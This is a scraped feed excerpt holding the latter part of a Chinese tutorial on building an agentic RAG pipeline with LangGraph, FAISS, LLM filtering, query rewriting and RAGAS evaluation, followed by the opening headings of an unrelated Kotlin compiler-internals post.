<li><strong><code>eval_using_RAGAS</code>：</strong>  最终且关键的一步。我们使用 <strong>RAGAS</strong> 框架来<strong>评估</strong>答案的性能，主要检查<strong>准确性 (Accuracy)</strong>  和对源文本的忠实度 (Groundedness)。</li>
</ul>
<h3 data-id="heading-6">步骤2：构建关键技术模块</h3>
<p>构建一个复杂的、生产级 RAG 系统是一个<strong>迭代和多层级</strong>的过程。它从精细的<strong>数据处理</strong>开始，通过<strong>逻辑分块</strong>优化检索，利用<strong>匿名化</strong>来消除 LLM 偏差，然后通过 <strong>LangGraph</strong> 实现一个具备<strong>规划、反思和自我纠正能力</strong>的 Agent 系统，最终用 <strong>RAGAS</strong> 保证输出的<strong>准确性</strong>和<strong>可靠性</strong>。</p>
<p>构建 RAG 的基础在于数据的质量和结构。</p>
<ul>
<li><strong>数据清洗 (Cleaning Our Data)：</strong>  这是任何生产系统的第一步。涉及去除噪声、处理缺失值、格式统一等。</li>
<li><strong>分块策略 (Breaking our Data)：</strong>  我们需要测试不同的分块策略，包括：</li>
</ul>

<ul>
<li><strong>传统分块：</strong>  基于固定字符数或句子的简单分割。</li>
<li><strong>逻辑分块：</strong>  基于文档结构（如标题、段落、章节）的语义化分割，它能更完整地保留上下文的<strong>连贯性</strong>。</li>
</ul>
<p>为了解决<strong>高噪音</strong>和<strong>检索低效</strong>问题，我们引入了子图 (Sub Graph) 架构：</p>
<ul>
<li><strong>子图作用：</strong>  通过创建专门的检索子图，我们可以将检索过程<strong>聚焦</strong>到最相关的信息上，有效过滤掉噪音。</li>
<li><strong>创建子图解决 Hallucinations：</strong>  一个专门的子图可以专注于<strong>事实的验证</strong> 和<strong>证据的蒸馏 (Distillation)</strong>  ，确保最终答案是“事实扎根 (Grounded on Facts)”的。</li>
</ul>
<p>我们利用 <strong>LangGraph</strong> 来实现 Agent 的规划与执行逻辑。LangGraph 提供了一个强大的框架来<strong>可视化</strong>和<strong>管理</strong>多步、有状态的 Agent 流程。这使得我们能够清晰地看到 <code>task_handler</code>、<code>replan</code> 等节点如何形成一个<strong>可回溯的循环</strong>，极大地提高了复杂流程的<strong>可调试性</strong>和<strong>可解释性</strong>。</p>
<p>一个生产级系统必须能够<strong>量化</strong>其性能。我们采用 <strong>RAGAS (RAG Assessment)</strong>  框架进行评估。</p>

























<table><thead><tr><th><strong>RAGAS 关键指标</strong></th><th><strong>关注点</strong></th><th><strong>目标</strong></th></tr></thead><tbody><tr><td><strong>忠实度 (Faithfulness)</strong></td><td>衡量生成答案的<strong>内容</strong>是否完全基于<strong>检索到的上下文</strong>。</td><td>最小化幻觉 (Hallucination)。</td></tr><tr><td><strong>相关性 (Relevancy)</strong></td><td>衡量检索到的上下文是否与原始问题<strong>高度相关</strong>。</td><td>优化检索器性能。</td></tr><tr><td><strong>上下文召回率 (Context Recall)</strong></td><td>衡量检索到的上下文是否<strong>充分完整地包含</strong>了生成答案所需的所有事实。</td><td>确保检索到的信息是全面且可靠的。</td></tr></tbody></table>
<h3 data-id="heading-7">步骤3：为生产级 RAG 系统打下环境基础</h3>
<p>任何生产级应用的首要任务都是<strong>安全地管理敏感信息</strong>，主要是 API 密钥。我们通过环境变量来加载这些密钥，避免将其硬编码到代码中。</p>






























<table><thead><tr><th><strong>组件类别</strong></th><th><strong>作用</strong></th><th><strong>选型考量</strong></th></tr></thead><tbody><tr><td><strong>大语言模型 (LLM)</strong></td><td>负责<strong>理解</strong>问题、<strong>规划</strong>步骤、<strong>重写</strong>查询、<strong>合成</strong>最终答案。</td><td><strong>性能、成本、响应速度</strong> 。</td></tr><tr><td><strong>向量编码器 (Embedding)</strong></td><td>负责将文本<strong>转化为向量</strong>，以进行语义搜索和检索。</td><td><strong>准确性、模型尺寸、运行效率</strong> 。</td></tr><tr><td><strong>向量数据库 (Vector DB) &amp; 检索</strong></td><td>负责<strong>存储</strong>和<strong>高效检索</strong>向量化的数据块 (Chunks)。</td><td><strong>检索速度、扩展性</strong> 。</td></tr><tr><td><strong>文本全文检索</strong></td><td>辅助向量检索，用于<strong>精确匹配</strong>或<strong>关键词过滤</strong>。</td><td><strong>精确性、过滤能力</strong> 。</td></tr></tbody></table>
<h3 data-id="heading-8">步骤4：传统与逻辑分块策略</h3>
<p>在对数据进行<strong>预处理和清洗</strong>之前，最关键的一步是定义我们的<strong>分块策略</strong>——即如何将一份长文档切割成可被检索的小单元。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/492f4825174f44aabd6bb43aab66a35b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=cdf9bHANCz1%2BjKb76T54j0FEa34%3D" alt="" loading="lazy"/></p>
<p><strong>逻辑分块</strong>旨在根据文档本身的<strong>结构和语义</strong>进行切割，确保每个块都包含一个完整、有意义的概念。在我们的故事书中， <strong>“章节 (Chapters)”</strong>  和  <strong>“引述 (Quotes)”</strong>  是最理想的逻辑断点。</p>
<p>在小说中，<strong>引述</strong>往往浓缩了关键对话、人物关系或重要情节，是次于章节的重要信息单元。在金融文档中，这可能对应于<strong>表格</strong>或<strong>财务报表</strong>等关键数据块。</p>
<p><strong>逻辑分块的优势：</strong></p>
<ul>
<li><strong>语义完整性：</strong>  保证了每个块（章节或引述）都具有清晰、完整的语义，极大地提高了检索的相关性 (Relevancy)。</li>
<li><strong>定制化检索：</strong>  允许我们在 RAG 管道中创建专门的检索器，例如，一个专门用于检索<strong>关键对话</strong>的工具（如在 Agent 系统中）。</li>
</ul>
<h3 data-id="heading-9">步骤5：数据清洗（为 RAG 系统准备纯净的文本）</h3>
<p>原始的 PDF 提取文本中往往充斥着各种格式错误，如多余的空格、制表符和不当的换行符。这些“噪音”会显著<strong>增加 Token 消耗</strong>、<strong>降低 Embedding 质量</strong>，并最终影响 LLM 的推理效率和准确性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21657184d43147d2881cd200c4604a03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=OEQJ2VgvswCS7CIjPVgX%2BWnOG3c%3D" alt="" loading="lazy"/></p>
<p>尽管我们清除了制表符，但文本中仍存在大量<strong>不必要的换行符 (<code>\n</code>)</strong>  和<strong>多重空格</strong>。这些字符不仅增加了 Token 数量，还可能导致单词在不同的行之间被错误地分割。</p>
<p>为什么这个分析很重要？</p>
<ol>
<li><strong>LLM 上下文窗口限制：</strong>  大语言模型的 <strong>Context Window</strong> (上下文窗口) 长度是固定的。如果我们的检索单元（章节）过长，超过了 LLM 的处理能力，LLM 就可能无法处理全部信息。</li>
<li><strong>RAG 系统的处理粒度：</strong>  尽管在我们的案例中（章节字数远低于大多数主流 LLM 的上下文限制），这些数据看起来安全。但在处理极长文档（如法律文件或技术手册）时，如果章节字数过高，我们可能需要对<strong>章节</strong>进行进一步的<strong>分块 (Sub-Chunking)</strong> ，或采用<strong>摘要 (Summarization)</strong>  策略，以确保信息能被 LLM 完全接收和有效推理。</li>
</ol>
<h3 data-id="heading-10">步骤6：数据向量化（构建高效检索的基础）</h3>
<p>下一步是将我们的文本数据转化为机器可理解的数学形式——<strong>向量 (Vectors)</strong> 。这是 RAG (Retrieval-Augmented Generation) 系统的核心，它使得我们可以进行<strong>语义相似性搜索</strong>，而不是传统的关键词匹配。</p>
<p>在环境设置阶段，我们已经确定使用 <strong>ML2 BERT 模型 (m2_bert_80M_32K)</strong>  进行向量编码。 这款模型具备 <strong>32k 的上下文窗口</strong>（虽然编码器主要关注输入长度，但这个大窗口显示了其处理长文本的能力）和相对高效的性能，非常适合在 RAG 设置中对文档进行<strong>密集向量表示</strong>。</p>
<p>为了高效地存储和检索这些高维向量，我们选择了 <strong>FAISS (Facebook AI Similarity Search)</strong> 。 它是 Meta 开源的库，专门用于<strong>高效的相似性搜索</strong>和<strong>聚类</strong>。许多主流云端向量数据库（如 Qdrant、Pinecone）也常常集成或支持 FAISS 的底层技术，以提升大规模数据的检索性能。</p>
<p>将不同类型的分块（传统块、章节摘要、特定引述）存储在<strong>独立的向量数据库</strong>中，使我们的 RAG 系统能够实现<strong>多策略检索</strong>。例如：</p>
<ol>
<li>回答需要<strong>精确证据</strong>的问题时，可以使用 <code>quotes_vectorstore</code>。</li>
<li>回答需要<strong>宏观背景</strong>的问题时，可以使用 <code>chapter_summaries_vectorstore</code>。</li>
<li>回答需要<strong>详细上下文</strong>的问题时，可以使用 <code>book_splits_vectorstore</code>。</li>
</ol>
<h3 data-id="heading-11">步骤7：多策略上下文检索器</h3>
<p>现在进入 RAG 管道的核心环节：<strong>构建检索器 (Retriever)</strong> 。检索器的目标是从我们多样化的数据集中（传统分块、章节摘要、引述）<strong>高效且准确</strong>地抓取与用户问题最相关的上下文。</p>
<p>我们的第一个核心 RAG 函数 <code>retrieve_context_per_question</code>，将负责协调这三种检索策略，并整合所有获取到的信息。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 函数的核心逻辑（流程简述）  </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve_context_per_question</span>(<span class="hljs-params">state</span>):  
    <span class="hljs-comment"># 1. 获取问题 question = state["question"]  </span>
    <span class="hljs-comment"># 2. 调用 book_chunks_retriever 获取详细 context  </span>
    <span class="hljs-comment"># 3. 调用 chapter_summaries_retriever 获取 summary_context (包含章节号)  </span>
    <span class="hljs-comment"># 4. 调用 book_quotes_retriever 获取 quotes_context  </span>
      
    <span class="hljs-comment"># 5. 拼接 all_contexts = context + summary_context + quotes_context  </span>
    <span class="hljs-comment"># 6. 清洗转义字符  </span>
      
    <span class="hljs-comment"># 7. 返回 {"context": all_contexts, "question": question}</span>
</code></pre>
<p>函数返回一个包含<strong>整合上下文</strong>和<strong>原始问题</strong>的新状态字典，准备传递给 RAG 管道的下一个步骤，例如<strong>查询重写</strong>或<strong>答案生成</strong>。</p>
<p>通过这种多策略的、精细化 Top-K 设置的检索方法，我们确保了 LLM 在生成答案时能获得最<strong>多样化</strong>、最<strong>相关</strong>且具备<strong>高可信度</strong>的证据链。</p>
<h3 data-id="heading-12">步骤8：使用 LLM 过滤无关信息</h3>
<p>即使通过多策略检索器获取了文档，向量相似性搜索仍可能返回一些与核心问题<strong>相关度较低</strong>的噪音信息。这些无关内容会占用 LLM 的<strong>上下文窗口 (Context Window)</strong> ，稀释真正重要的事实，甚至可能分散 LLM 的注意力，导致<strong>生成质量下降</strong>（即著名的“针在干草堆”问题）。</p>
<p>为了解决这个问题，我们在检索步骤后引入了一个关键的后处理环节：<strong>使用 LLM 作为精炼过滤器 (Refinement Filter)</strong>  ，去除无关信息，只保留对回答问题有价值的内容。</p>
<p>我们首先定义一个<strong>指令清晰</strong>的 Prompt 模板，来指导 LLM 完成内容过滤任务。这个 Prompt 严格限制了 LLM 的行为：</p>
<ul>
<li><strong>输入：</strong>  用户的查询 (<code>{query}</code>) 和检索到的所有文档内容 (<code>{retrieved_documents}</code>)。</li>
<li><strong>核心指令：</strong>  过滤掉所有与查询<strong>不相关</strong>的信息。</li>
</ul>
<h3 data-id="heading-13">步骤9：查询重写器（优化检索的“语义桥梁”）</h3>
<p>在 RAG 管道中，用户最初的提问（Query）往往<strong>不够精确</strong>或<strong>过于简略</strong>。如果直接使用这样的查询进行向量检索，可能会导致：</p>
<ol>
<li><strong>检索不准确：</strong>  无法捕获查询的完整<strong>语义意图</strong>，返回不相关的文档。</li>
<li><strong>内容不足：</strong>  检索结果无法提供足够的信息来支撑高质量的回答。</li>
</ol>
<p>与上下文过滤器类似，我们首先使用 <strong>Pydantic</strong> 定义了 LLM 输出的结构，以确保重写后的结果是<strong>稳定、可控</strong>的 JSON 格式。</p>























<table><thead><tr><th><strong>字段</strong></th><th><strong>类型</strong></th><th><strong>描述</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td><strong><code>rewritten_question</code></strong></td><td>字符串</td><td>经过优化的、用于向量检索的改进问题。</td><td><strong>核心输出</strong> ：用于替代原始查询进行检索。</td></tr><tr><td><strong><code>explanation</code></strong></td><td>字符串</td><td>对重写后问题的解释和理由。</td><td><strong>可解释性</strong> ：便于调试和理解 LLM 的推理过程。</td></tr></tbody></table>
<h3 data-id="heading-14">步骤10：Chain-of-Thought (CoT) 推理（增强 LLM 的答案生成能力）</h3>
<p>CoT 推理的一个挑战是确保 LLM 每次都能以<strong>一致的、高质量的逻辑风格</strong>进行推理。我们通过 <strong>Few-Shot CoT</strong> 方法来解决这个问题：在 Prompt 模板中提供多个推理范例 (Examples)，展示所需的思维链条和最终答案结构。</p>
<p>我们提供的范例展示了三种关键推理场景：</p>
<ol>
<li><strong>逻辑比较 (Example 1)：</strong>  涉及关系推理和排序（Mary &gt; Tom &gt; Jane）。</li>
<li><strong>信息聚合 (Example 2)：</strong>  涉及从上下文中提取和总结多个事实。</li>
<li><strong>信息缺失判断 (Example 3)：</strong>  明确指出当上下文中<strong>不包含</strong>足够信息时，LLM 应该回答“没有足够的上下文”。</li>
</ol>
<p>当 LLM 接收到用户的<strong>查询</strong>和<strong>精炼后的上下文</strong>后，它将被要求先输出一个名为 <code>Reasoning</code> 的内部思考过程，最后再输出最终的 <code>Final Answer</code>。</p>
<h3 data-id="heading-15">步骤11：相关性与事实基础检查（RAG 管道的最终校准）</h3>
<p>在 RAG 管道中，<strong>检索</strong>、<strong>过滤</strong>和 <strong>CoT 推理</strong>是核心。然而，为了确保系统的<strong>高准确度 (High Accuracy)</strong>  和<strong>可信度 (Trustworthiness)</strong> ，我们需要对检索到的信息和生成的答案进行最终的<strong>双重验证</strong>：</p>
<ol>
<li><strong>传统相关性检查：</strong>  检查<strong>文档本身</strong>是否与查询相关。</li>
<li><strong>事实基础检查 (Ground Truth)：</strong>  检查 <strong>LLM 生成的答案</strong>是否完全基于提供的上下文，防止幻觉 (Hallucination)。</li>
</ol>
<h3 data-id="heading-16">步骤12：使用 LangGraph 可视化我们的 RAG 管道</h3>
<p>我们的 RAG 解决方案是一个<strong>有向图 (Directed Graph)</strong> ，它定义了一个基于<strong>条件逻辑</strong>和<strong>循环反馈</strong>的工作流。这个工作流不是线性的，而是具备自适应能力的 <strong>Agentic RAG</strong> 模式。</p>
<p>我们将之前实现的五个关键功能（<code>retrieve</code>、<code>filter</code>、<code>rewrite</code>、<code>answer</code>）作为图中的<strong>节点 (Nodes)</strong>  添加到工作流中。每个节点都代表一个单一、独立的处理步骤。</p>






























<table><thead><tr><th><strong>节点名称</strong></th><th><strong>对应功能</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td><strong><code>retrieve</code></strong></td><td><code>retrieve_context_per_question</code></td><td>从向量存储中获取多源上下文。</td></tr><tr><td><strong><code>filter</code></strong></td><td><code>keep_only_relevant_content</code></td><td>使用 LLM 过滤上下文中的无关信息。</td></tr><tr><td><strong><code>rewrite</code></strong></td><td><code>rewrite_question</code></td><td>使用 LLM 优化查询，以进行更好的检索。</td></tr><tr><td><strong><code>answer</code></strong></td><td><code>answer_question_from_context</code></td><td>使用 CoT 推理生成答案。</td></tr></tbody></table>
<p>通过 LangGraph 的 <code>draw_mermaid_png</code> 方法，我们可以将上述逻辑清晰地呈现为图形，直观地展示了 <strong>LangGraph 如何创建了一个具备推理、决策和自优化能力的 Agentic RAG 管道。</strong></p>
<p>这个可视化图清晰地体现了流程中的<strong>两个核心循环</strong>：</p>
<ol>
<li><strong>检索优化循环 (<code>filter``rewrite``retrieve</code>):</strong>  当第一次检索的上下文质量不足时，系统会自动优化查询并进行二次检索。</li>
<li><strong>答案自修复循环 (<code>answer``answer</code> 或 <code>rewrite</code>):</strong>  当生成的答案存在幻觉时，LLM 尝试重新生成；当答案信息不足时，系统会尝试优化查询，从头开始获取更多上下文。</li>
</ol>
<h3 data-id="heading-17">步骤13：子图架构与内容蒸馏基础检查</h3>
<p>在复杂的 RAG 应用场景中，尤其是在处理需要多步骤推理或任务分解的查询时，线性的 RAG 流程往往力不从心。为了构建更<strong>模块化 (Modular)</strong> 、更<strong>健壮 (Robust)</strong>  和<strong>可扩展 (Scalable)</strong>  的解决方案，我们引入了 <strong>子图架构 (Sub-Graph Approach)</strong>  和<strong>内容蒸馏 (Distillation Grounding)</strong>  机制。</p>
<p>子图方法的核心思想是将一个复杂的工作流分解为多个<strong>独立的、功能专注的子图</strong>。</p>
<ul>
<li><strong>传统 RAG：</strong>  单一的大图包含所有逻辑，维护和调试复杂。</li>
<li><strong>子图架构：</strong>  每个核心功能（如查询重写、文档过滤、事实核查）都可以被封装为一个独立的 <strong>LangGraph 子图</strong>。这些子图拥有自己的输入、输出和内部逻辑，它们像乐高积木一样，可以被主图<strong>调用 (Invoke)</strong>  或<strong>链接 (Chain)</strong>  起来。</li>
</ul>
<p>通过 <strong>LangGraph 子图 (Sub-Graph)</strong>  方法，我们可以为每个数据源定制一个<strong>专注的</strong>、<strong>自校验的</strong>检索工作流。这不仅提高了模块化程度，还确保了每个源的输出内容都经过了严格的<strong>事实基础 (Grounding)</strong>  检查。</p>
<p>我们定义了一个高阶函数 <code>build_retrieval_workflow</code>，它能够为任何给定的检索函数（<code>retrieve_fn</code>）构建一个<strong>自循环校验</strong>的子图。</p>
<p>这个子图的核心是<strong>内容蒸馏</strong>和<strong>事实基础检查</strong>的循环机制：</p>
<ol>
<li><strong>节点 1：检索 (<code>node_name</code>)</strong>  - 获取原始上下文。</li>
<li><strong>节点 2：过滤 (<code>keep_only_relevant_content</code>)</strong>  - 使用 LLM（如 Llama 3.3）将原始上下文提炼为 <code>relevant_context</code>。</li>
<li><strong>条件边缘：事实基础检查 (<code>is_distilled_content_grounded_on_content</code>)</strong>  - 这一步是关键的质量门 (Quality Gate)。它检查：</li>
</ol>
<ul>
<li><strong>如果</strong>提炼后的内容<strong>完全基于</strong>原始上下文 (<code>"grounded on the original context"</code>) 结束 (END)，输出可靠的提炼内容。</li>
<li><strong>如果</strong>提炼过程中<strong>引入了新的信息</strong>（幻觉） <strong>循环回到过滤节点</strong> (<code>"keep_only_relevant_content"</code>)，要求 LLM <strong>重新</strong>进行提炼，直到内容符合事实基础要求。</li>
</ul>
<h3 data-id="heading-18">步骤14：构建抗幻觉子图（提升 RAG 答案可信度）</h3>
<p>为了在最终的答案生成阶段引入一个<strong>严格的质量控制机制</strong>，我们创建了一个专门的 <strong>LangGraph 子图</strong>，其核心目标是：<strong>确保生成的答案完全基于提供的上下文</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b3ece199a2b45e994132eab4b3c4f6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=b%2FgqjiIvXDEoTLtlkjE%2BHg9shRY%3D" alt="" loading="lazy"/></p>
<p>我们构建了一个专用于答案生成的子图。这个图结构非常简洁，但却包含了一个强大的<strong>自修复循环</strong>：</p>
<ol>
<li><strong>节点：</strong> <code>answer</code>（调用 <code>answer_question_from_context</code> 函数生成答案）。</li>
<li><strong>入口点：</strong>  流程始于 <code>answer</code> 节点。</li>
<li><strong>条件边缘：</strong>  答案生成后，立即通过 <code>is_answer_grounded_on_context</code> 函数进行校验：</li>
</ol>
<ul>
<li><strong>如果</strong>校验结果为 <code>"grounded on context"</code>结束 (END)，答案可靠。</li>
<li><strong>如果</strong>校验结果为 <code>"hallucination"</code><strong>循环回到 <code>answer</code> 节点</strong>，要求 LLM 在相同的上下文中<strong>重新生成</strong>答案。</li>
</ul>
<h3 data-id="heading-19">步骤15：RAGAS最终编译、测试与评估</h3>
<p>编译后的 RAG 管道不再是简单的线性流程，而是一个高度复杂的、自适应的图结构：</p>
<ol>
<li><strong>去偏见 (Anonymize)：</strong>  匿名化用户查询，防止 LLM 规划时产生先验知识偏见。</li>
<li><strong>规划 (Plan)：</strong>  基于匿名查询创建高层执行策略。</li>
<li><strong>反匿名化 (De-anonymize)：</strong>  将实体重新映射回计划，使其具备上下文。</li>
<li><strong>分解 (Break Down)：</strong>  将高层计划细化为可执行的工具任务。</li>
<li><strong>执行 (Execute/Task Handler)：</strong>  根据当前任务选择并调用对应的<strong>检索子图</strong>（Quotes, Chunks, Summaries）。</li>
<li><strong>重规划 (Replanning)：</strong>  检索后，LLM 评估新获取的上下文，动态调整剩余计划。</li>
<li><strong>答案生成 (Answer)：</strong>  当有足够信息时，调用<strong>抗幻觉子图</strong>，生成最终答案。</li>
<li><strong>结束 (END)：</strong>  答案通过事实校验后，流程终止。</li>
</ol>
<p>测试完成后，我们使用 <strong>RAGAS</strong>（一个用于评估 RAG 系统的先进框架）对管道进行<strong>客观量化评估</strong>。</p>
<p>我们选择了五个关键指标来全面评估 RAG 系统的质量：</p>
<ol>
<li><strong>Answer Correctness (答案正确性):</strong>  答案是否事实正确。</li>
<li><strong>Faithfulness (忠实度):</strong>  答案是否只基于提供的上下文（防幻觉）。</li>
<li><strong>Answer Relevancy (答案相关性):</strong>  答案是否精确回答了问题。</li>
<li><strong>Context Recall (上下文召回率):</strong>  有用信息是否都被检索到。</li>
<li><strong>Answer Similarity (答案相似度):</strong>  答案与标准答案的语义相似程度。</li>
</ol>
<h2 data-id="heading-20">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-7]]></title>    <link>https://juejin.cn/post/7575897635137945600</link>    <guid>https://juejin.cn/post/7575897635137945600</guid>    <pubDate>2025-11-24T12:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635137945600" data-draft-id="7571295102850662426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-7"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T12:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风冷"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-7
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风冷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:44:56.000Z" title="Mon Nov 24 2025 12:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>好的，我们将继续向 Kotlin 的更深层次探索。这部分将涵盖<strong>编译器内部原理、语言设计哲学、高级类型系统</strong>以及<strong>与其他语言的互操作</strong>等专家级主题。</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin 专家级探索：语言设计与实现原理</strong></h3>
<h4 data-id="heading-1"><strong>四十六、Kotlin 编译器内部原理</strong></h4>
<h5 data-id="heading-2"><strong>1. 编译器阶段与 IR（中间表示）</strong></h5>
